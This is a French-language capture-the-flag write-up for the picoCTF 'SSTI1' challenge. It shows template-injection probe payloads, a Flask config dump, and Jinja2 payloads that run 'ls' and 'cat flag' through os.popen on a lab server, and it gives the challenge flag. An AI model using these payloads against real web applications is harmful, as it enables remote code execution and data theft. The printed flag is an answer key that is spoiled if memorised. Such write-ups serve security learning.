# SSTI1 

## Description

I made a cool website where you can announce whatever you want! Try it out!
I heard templating is a cool and modular way to build web apps! Check out my website here!

## Writeup 

flag: picoCTF{s4rv3r_s1d3_t3mp14t3_1nj3ct10n5_4r3_c001_9451989d} 

hint : Server Side Template Injection

On arrive sur une page web qui comporte un formulaire avec un input. 
On se doute ici qu'il va falloir injecter quelque chose dans le 
input pour obtenir le flag (même sans lire le hint). 

Comme je ne suis pas certaine de la marche à suivre, je regarde le hint. 

Après une brève recherche, je trouve des payloads communs à injecter pour
tester le input : 

```
{{7*7}}

<%= 7*7 %>

${7*7}

```

Le premier retourne 49, c'est donc la syntaxe qu'on va utiliser. Le site retourne
avec Jinja2 (donc flask).

Il reste à trouver le bon objet à passer dans le input pour récupérer le flag. 

On fait un test avec `{{ config }} ` : 

```
<Config {'DEBUG': False, 'TESTING': False, 'PROPAGATE_EXCEPTIONS': None, 'SECRET_KEY': None, 'PERMANENT_SESSION_LIFETIME': datetime.timedelta(days=31), 'USE_X_SENDFILE': False, 'SERVER_NAME': None, 'APPLICATION_ROOT': '/', 'SESSION_COOKIE_NAME': 'session', 'SESSION_COOKIE_DOMAIN': None, 'SESSION_COOKIE_PATH': None, 'SESSION_COOKIE_HTTPONLY': True, 'SESSION_COOKIE_SECURE': False, 'SESSION_COOKIE_SAMESITE': None, 'SESSION_REFRESH_EACH_REQUEST': True, 'MAX_CONTENT_LENGTH': None, 'SEND_FILE_MAX_AGE_DEFAULT': None, 'TRAP_BAD_REQUEST_ERRORS': None, 'TRAP_HTTP_EXCEPTIONS': False, 'EXPLAIN_TEMPLATE_LOADING': False, 'PREFERRED_URL_SCHEME': 'http', 'TEMPLATES_AUTO_RELOAD': None, 'MAX_COOKIE_SIZE': 4093}>
```

Ca nous confirme donc qu'on fonctionne bien avec Jinja2. 
Et également que le flag n'est pas dans SECRET_KEY.


```
{{lipsum.__globals__.os.popen('ls -la').read()}}

total 12 
drwxr-xr-x 1 root root 25 Jan 7 20:40 . 
drwxr-xr-x 1 root root 23 Jan 7 20:40 .. 
drwxr-xr-x 2 root root 32 Jan 7 20:40 __pycache__ 
-rwxr-xr-x 1 root root 1241 May 1 2025 app.py 
-rw-r--r-- 1 root root 58 Aug 21 19:27 flag 
-rwxr-xr-x 1 root root 268 May 1 2025 requirements.txt
```

Avec l'accès aux fichiers, on repère le flag.

```
{{lipsum.__globals__.os.popen('cat flag').read()}}

picoCTF{s4rv3r_s1d3_t3mp14t3_1nj3ct10n5_4r3_c001_9451989d}
```
